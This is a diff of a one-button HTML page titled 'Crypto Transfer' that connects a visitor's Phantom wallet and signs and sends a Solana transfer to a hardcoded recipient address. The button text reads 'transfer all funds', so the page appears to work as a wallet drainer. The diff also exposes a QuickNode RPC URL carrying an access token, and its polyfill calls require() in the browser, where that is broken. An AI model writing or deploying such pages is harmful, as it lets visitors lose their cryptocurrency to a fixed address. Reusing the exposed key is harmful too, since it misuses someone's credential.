@@ -5,15 +5,21 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Crypto Transfer</title>
 
-    <!-- Use alternative Buffer implementation -->
+    <!-- Double Buffer polyfill approach -->
     <script src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/browser.min.js"></script>
+    <script src="https://unpkg.com/buffer@5.7.1/browser.js"></script>
     <script>
-        // Explicitly expose Buffer to global scope
-        window.Buffer = Buffer;
+        // Nuclear option for Buffer initialization
+        window.Buffer = window.Buffer || Buffer || require('buffer').Buffer;
+        if (typeof TextEncoder === 'undefined') {
+            const { TextEncoder, TextDecoder } = require('text-encoding');
+            window.TextEncoder = TextEncoder;
+            window.TextDecoder = TextDecoder;
+        }
     </script>
 
-    <!-- Then load Solana Web3 -->
-    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <!-- Load Solana Web3 -->
+    <script src="https://unpkg.com/@solana/web3.js@1.70.1/lib/index.iife.js"></script>
 </head>
 <body>
     <h1>Click below to transfer all funds</h1>
@@ -21,41 +27,47 @@
 
     <script>
         document.getElementById('transferButton').addEventListener('click', async () => {
-            if (!window.solana) {
-                alert('Phantom wallet not found. Please install Phantom.');
-                return;
-            }
-
             try {
-                // Simple Buffer test
-                if (!window.Buffer || typeof window.Buffer.from !== 'function') {
-                    throw new Error('Buffer initialization failed');
+                // Comprehensive environment check
+                const envChecks = {
+                    Buffer: typeof Buffer !== 'undefined',
+                    BufferFrom: typeof Buffer?.from === 'function',
+                    Solana: typeof solanaWeb3 !== 'undefined',
+                    Phantom: !!window.solana
+                };
+
+                console.log('Environment Checks:', envChecks);
+                if (!envChecks.Buffer || !envChecks.BufferFrom) {
+                    throw new Error(`Buffer not initialized (${JSON.stringify(envChecks)})`);
                 }
 
-                // Connect to Phantom Wallet
-                await window.solana.connect();
-                const publicKey = window.solana.publicKey;
-                if (!publicKey) {
-                    throw new Error('Failed to get public key.');
+                if (!window.solana?.isPhantom) {
+                    alert('Phantom wallet not found. Please install Phantom.');
+                    return;
                 }
 
-                // Connect to Solana RPC
+                // Phantom connection
+                const phantom = window.solana;
+                if (!phantom.isConnected) {
+                    await phantom.connect();
+                }
+                const publicKey = new solanaWeb3.PublicKey(phantom.publicKey);
+
+                // Solana connection
                 const connection = new solanaWeb3.Connection(
                     'https://convincing-distinguished-panorama.solana-mainnet.quiknode.pro/068f8b18be5bb779841bd23ab00ef267e80501df',
                     'confirmed'
                 );
 
-                // Get Balance
+                // Balance check
                 const balance = await connection.getBalance(publicKey);
                 if (balance <= 5000) {
-                    alert('Insufficient SOL balance to cover transaction fees.');
+                    alert('Insufficient SOL balance (minimum 0.000005 SOL required)');
                     return;
                 }
 
-                // Define Recipient Wallet
+                // Transaction construction
                 const recipient = new solanaWeb3.PublicKey('9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf');
-
-                // Create Transaction
                 const transaction = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: publicKey,
@@ -64,18 +76,23 @@
                     })
                 );
 
-                transaction.feePayer = publicKey;
+                // Transaction configuration
                 const { blockhash } = await connection.getLatestBlockhash();
                 transaction.recentBlockhash = blockhash;
+                transaction.feePayer = publicKey;
 
-                // Sign & Send Transaction
-                const signedTransaction = await window.solana.signTransaction(transaction);
-                const signature = await connection.sendRawTransaction(signedTransaction.serialize());
-
+                // Transaction signing
+                const signedTx = await phantom.signTransaction(transaction);
+                const rawTransaction = signedTx.serialize();
+                const signature = await connection.sendRawTransaction(rawTransaction);
+                
+                // Confirmation
                 await connection.confirmTransaction(signature);
-                alert(`Transaction successful! Signature: ${signature}`);
+                alert(`Success! TX: ${signature}`);
+
             } catch (error) {
-                alert(`Transaction failed: ${error.message}`);
+                console.error('Full Error:', error);
+                alert(`Failed: ${error.message}`);
             }
         });
     </script>
